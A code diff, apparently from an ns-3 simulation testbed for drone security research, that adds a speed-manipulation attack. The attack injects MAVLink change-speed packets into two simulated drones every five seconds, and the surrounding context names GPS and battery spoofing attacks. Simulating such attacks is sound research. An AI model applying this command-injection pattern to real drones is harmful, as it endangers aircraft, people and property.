@@ -614,6 +614,40 @@ void ExecuteSpoofDroneGPSAttack(Ptr<Socket> socket) {
     }
 }
 
+// Execute Speed Change attack
+void ExecuteSpeedManipulationAttack(Ptr<Socket> socket) {
+    // Slow down drone 1 and drone 2 (system IDs 2 and 3)
+    float slowSpeed = 2.0f; // 2 m/s (slow speed)
+    uint8_t speedType = 1;  // 1 = groundspeed
+    
+    std::vector<uint8_t> speed1 = CreateChangeSpeedPacket(2, speedType, slowSpeed); // Drone1 sysid=2
+    std::vector<uint8_t> speed2 = CreateChangeSpeedPacket(3, speedType, slowSpeed); // Drone2 sysid=3
+    
+    Ptr<Packet> packet1 = Create<Packet>(speed1.data(), speed1.size());
+    Ptr<Packet> packet2 = Create<Packet>(speed2.data(), speed2.size()); 
+    
+    // Send to drone1 and drone2 on port 20000 (MAVLink port)
+    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 20000));
+    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 20000));
+    
+    NS_LOG_INFO("Attacker sent speed reduction commands to drones 1 and 2 at " 
+                << Simulator::Now().GetSeconds() << "s");
+    
+    // Publish to ZMQ
+    if (g_commandPublisher) {
+        zmq::message_t zmqMsg1(speed1.data(), speed1.size());
+        zmq::message_t zmqMsg2(speed2.data(), speed2.size());
+        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
+        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
+        NS_LOG_INFO("Published speed manipulation commands to ZMQ 5555");
+    }
+    
+    // Schedule next attack (every 5 seconds) to maintain the slow speed
+    if (Simulator::Now().GetSeconds() < 180.0) {
+        Simulator::Schedule(Seconds(5.0), &ExecuteSpeedManipulationAttack, socket);
+    }
+}
+
 
 // Execute battery percentage spoofing attack
 void ExecuteBatteryPercentageSpoofingAttack(Ptr<Socket> socket) {
